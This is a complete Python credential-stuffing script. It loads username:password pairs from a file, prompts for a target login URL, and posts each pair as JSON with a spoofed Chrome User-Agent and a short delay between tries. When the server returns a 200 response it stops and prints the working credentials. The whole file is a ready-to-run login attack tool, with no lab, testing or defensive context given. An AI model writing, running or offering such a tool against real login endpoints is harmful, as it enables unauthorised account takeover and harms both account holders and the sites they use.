#!/usr/bin/env python3

import requests
import time
import sys
import os

HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Chrome/143.0.0.0",
}

def usage():
    print(f"""
Usage:
    python3 {sys.argv[0]} <credentials_file>

Example:
    python3 {sys.argv[0]} users.txt

File format (one per line):
    username:password
""")
    sys.exit(1)

def main():
    # ---- argument check ----
    if len(sys.argv) != 2:
        usage()

    creds_file = sys.argv[1]

    if not os.path.isfile(creds_file):
        print(f"[!] File not found: {creds_file}")
        sys.exit(1)

    # ---- ask for URL ----
    url = input("[?] Enter target login URL: ").strip()
    if not url:
        print("[!] URL cannot be empty")
        sys.exit(1)

    # ---- read credentials ----
    with open(creds_file, "r", encoding="utf-8", errors="ignore") as f:
        lines = [line.strip() for line in f if ":" in line]

    if not lines:
        print("[!] No valid username:password entries found")
        sys.exit(1)

    print(f"[*] Loaded {len(lines)} credential pairs")
    print(f"[*] Target: {url}\n")

    session = requests.Session()

    for line in lines:
        username, password = line.split(":", 1)

        payload = {
            "username": username,
            "password": password
        }

        try:
            response = session.post(
                url,
                json=payload,
                headers=HEADERS,
                timeout=15
            )

            if response.status_code == 200:
                print("\n[+] SUCCESS!")
                print(f"[+] Username: {username}")
                print(f"[+] Password: {password}")
                print(f"[+] Response: {response.text}")
                return
            else:
                print(f"[-] Failed: {username}", end="\r")

            time.sleep(0.1)

        except requests.exceptions.RequestException:
            print(f"\n[!] Connection error for {username}, retrying...")
            time.sleep(2)

    print("\n[-] No valid credentials found")

if __name__ == "__main__":
    main()
